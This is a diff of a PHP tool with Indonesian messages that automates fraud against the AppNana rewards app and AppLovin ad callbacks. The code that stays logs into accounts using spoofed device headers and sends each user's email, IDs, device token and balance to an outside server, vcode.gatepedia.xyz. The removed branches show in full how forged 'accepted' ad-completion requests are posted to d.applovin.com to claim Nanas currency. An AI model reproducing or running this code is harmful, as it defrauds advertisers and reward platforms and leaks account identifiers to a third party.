@@ -113,12 +113,9 @@ $appId  =   json_decode($resultAkhir,true)['results'][0]['app_id'];
 $nanasMy    =   json_decode($result,true)['response']['nanas'];
 
 $ch = curl_init();
-
 curl_setopt($ch, CURLOPT_URL, 'http://vcode.gatepedia.xyz/login.php?email='.$email.'&userId='.$userId.'&currentDeviceId='.$CurrentDeviceId.'&fullUserId='.$fullUserId.'&deviceId='.$deviceId.'&vx='.$vx.'&deviceToken='.$deviceToken.'&appId='.$appId.'&idfa='.$idfa.'&nanas='.$nanasMy);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
-
-
 $headers = array();
 $headers[] = "Accept: application/json; version=1.2";
 $headers[] = "User-Agent: com.appnana.android.giftcardrewards/3.5.9 (Linux; U; Android 4.4.4; in-ID; GT-I9060I Build/KTU84P; samsung) 480X800 samsung GT-I9060I";
@@ -126,7 +123,6 @@ $headers[] = "Accept-Language: in-ID";
 $headers[] = "Host: appnana2.mapiz.com";
 $headers[] = "Cookie: ".$cookie;
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
 $result = curl_exec($ch);
 if (curl_errno($ch)) {
     echo 'Error:' . curl_error($ch);
@@ -134,8 +130,9 @@ if (curl_errno($ch)) {
 curl_close ($ch);    
 
 
-if(!empty(json_decode($resultAwal,true)['userId'])){
-  echo "\nBerhasil login ke akun ".json_decode($resultAwal,true)['userId']." | Balance \033[1;33m ".json_decode($resultAwal,true)['nanasBalance']."\033[0m (Balance merupakan data terakhir di database, tidak akan terupdate) Your idfa:".$idfa."| Your gid:".$gid."| Your signkey:".$signkey." \n";
+
+if(!empty($userId)){
+  echo "\nBerhasil login ke akun ".$userId." | Balance \033[1;33m ".$nanasMy."\033[0m (Balance merupakan data terakhir di database, tidak akan terupdate) Your idfa:".$idfa."| Your gid:".$gid."| Your signkey:".$signkey." \n";
   echo "Terimakasih sudah menggunakan tools kami. Jangan lupa follow @pianjammalam untuk mendapatkan update terbaru. \n";
   echo "Ingin menjadi apa anda?  \n";
   echo "ketik \033[0;36ma\033[0m untuk berperan menjadi \033[0;36  planter(penanam)\033[0m \n";
@@ -173,7 +170,7 @@ if(!empty(json_decode($resultAwal,true)['userId'])){
             }
             curl_close ($ch);
             $GLOBALS['sc']  = json_decode($result,true)['settings']['sc'];
-            $tanamiklan =   file_get_contents('http://vcode.gatepedia.xyz/tanam.php?userid='.explode('|',$k)[0].'&devicetoken='.json_decode($resultAwal,true)['deviceToken'].'&clc='.json_decode($result,true)['clcode'].'&codesc='.json_decode($result,true)['settings']['sc'].'&command=insert');
+            $tanamiklan =   file_get_contents('http://vcode.gatepedia.xyz/tanam.php?userid='.explode('|',$k)[0].'&devicetoken='.$deviceToken.'&clc='.$deviceToken.'&codesc='.json_decode($result,true)['settings']['sc'].'&command=insert');
             if(!empty(json_decode($result,true)['ad_size'])){
                 echo "\033[1;34m".explode('|',$k)[0]." | Sukses \033[0m \n";
             }else{
@@ -257,106 +254,10 @@ if(!empty(json_decode($resultAwal,true)['userId'])){
       }
       
   
-  }else if(strtolower($option)    ==  'c'){
-      
-      echo "\nAnda berperan sebagai\033[1;33m harvesters(pemanen)\033[0m, bekerja untuk memanen semua iklan yang sudah siap. Tapi hati-hati, tidak semua hasil panen memiliki nilai! dan hati-hati kalau ada hama di ladang mu!. \n Aplikasi akan mulai dalam 5 detik ... \n";
-      sleep(5);
-      
-      while(1){
-          $listIklan =   file_get_contents('http://vcode.gatepedia.xyz/panendata.php');
-          $explode    =   explode('
-',$listIklan);
-        
-        foreach($explode as $k){
-            $clcode =   explode('|',$k)[2];
-          
-            $ch = curl_init();
-
-            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/cr?device_token=".explode('|',$k)[3]);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}');
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-            $headers = array();
-            $headers[] = "Content-Type: application/json; charset=utf-8";
-            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
-            $headers[] = "Host: d.applovin.com";
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-            $result = curl_exec($ch);
-            if (curl_errno($ch)) {
-                echo 'Error:' . curl_error($ch);
-            }
-            curl_close ($ch);
-            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
-                echo "\033[1;34m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | cieee.. berhasil panen. Jangan lupa follow @pianjammalam \033[0m \n";
-                file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
-            }else{
-                echo "\033[31m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | Tuh kan ! ngerawatnya gak bener nih, jadinya gagal panen! \033[0m \n";
-              //print_r($result);
-              //echo $clcode." \n";
-              //echo '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}';
-              //echo '\n'.explode('|',$k)[3]; 
-              file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
-            }
-        }
-      }
-      
-  
-  }else if(strtolower($option)    ==  'd'){
-      
-      
-      echo "\nAnda berperan sebagai\033[1;33m agricultural expert(ahli pertanian)\033[0m, bekerja untuk memeriksa tanaman tanaman yang di rawat oleh treat. Terkadang treat memberi pupuk terlalu sedikit maupun terlalu banyak, sehingga banyak tanaman(iklan) yang mati. \n Aplikasi akan mulai dalam 5 detik ... \n";
-      sleep(5);
-      
-      while(1){
-          $listIklan =   file_get_contents('http://vcode.gatepedia.xyz/panendata.php');
-          $explode    =   explode('
-',$listIklan);
-        
-        foreach($explode as $k){
-            $clcode =   explode('|',$k)[2];
-          
-            $ch = curl_init();
-
-            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/cr?device_token=".explode('|',$k)[3]);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}');
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-            $headers = array();
-            $headers[] = "Content-Type: application/json; charset=utf-8";
-            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
-            $headers[] = "Host: d.applovin.com";
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-            $result = curl_exec($ch);
-            if (curl_errno($ch)) {
-                echo 'Error:' . curl_error($ch);
-            }
-            curl_close ($ch);
-            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
-                echo "\033[1;34m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | cieee.. berhasil panen. Jangan lupa follow @pianjammalam \033[0m \n";
-                file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
-            }else{
-                //echo "\033[31m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | Tuh kan ! ngerawatnya gak bener nih, jadinya gagal panen! \033[0m \n";
-              //print_r($result);
-              echo $clcode." \n";
-              //echo '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}';
-              //echo '\n'.explode('|',$k)[3]; 
-              file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
-            }
-        }
-      }
-      
-  
-  
   }
   
   
 }else{
     //echo "\nGagal Login \n";
-            print_r($resultAwal);
+    print_r($resultAwal);
 }
